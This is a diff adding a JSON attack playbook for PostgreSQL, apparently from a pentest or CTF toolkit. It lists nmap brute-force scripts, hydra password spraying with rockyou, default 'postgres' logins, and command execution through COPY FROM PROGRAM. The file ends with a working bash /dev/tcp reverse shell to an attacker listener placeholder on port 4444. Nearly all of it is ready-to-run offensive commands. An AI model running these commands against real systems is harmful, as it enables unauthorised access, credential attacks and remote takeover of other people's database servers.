@@ -1,0 +1,63 @@
+{
+  "service": "PostgreSQL",
+  "port": 5432,
+  "categories": [
+    {
+      "category": "1. Recon & Spraying",
+      "tasks": [
+        {
+          "id": "psql_nmap",
+          "title": "Nmap PostgreSQL Scan",
+          "description": "Fingerprint the version and check for weak/default authentication.",
+          "commands": [
+            "nmap -sV -p 5432 --script pgsql-brute {target_ip}"
+          ]
+        },
+        {
+          "id": "psql_default_creds",
+          "title": "Try Default Credentials",
+          "description": "postgres/postgres and postgres/<blank> are extremely common defaults, especially on lab/CTF-style boxes.",
+          "commands": [
+            "psql -h {target_ip} -U postgres -d postgres",
+            "hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://{target_ip}"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "2. Authenticated Enumeration & RCE",
+      "tasks": [
+        {
+          "id": "psql_connect",
+          "title": "Connect & Enumerate",
+          "description": "Once authenticated, list databases/users and confirm your privilege level.",
+          "commands": [
+            "psql -h {target_ip} -U <user> -d <database>",
+            "\\l",
+            "\\du",
+            "SELECT current_user, session_user, version();"
+          ]
+        },
+        {
+          "id": "psql_copy_program_rce",
+          "title": "RCE via COPY FROM PROGRAM",
+          "description": "If your user has superuser rights (common misconfiguration), PostgreSQL >= 9.3 lets you execute arbitrary OS commands directly through SQL using COPY FROM PROGRAM.",
+          "commands": [
+            "CREATE TABLE rce_out(cmd_output text);",
+            "COPY rce_out FROM PROGRAM 'whoami';",
+            "SELECT * FROM rce_out;"
+          ]
+        },
+        {
+          "id": "psql_reverse_shell",
+          "title": "Reverse Shell via COPY FROM PROGRAM",
+          "description": "Chain the same technique into a full reverse shell back to your listener.",
+          "commands": [
+            "sudo rlwrap nc -lvnp 4444",
+            "COPY rce_out FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/<Kali_IP>/4444 0>&1\"';"
+          ]
+        }
+      ]
+    }
+  ]
+}
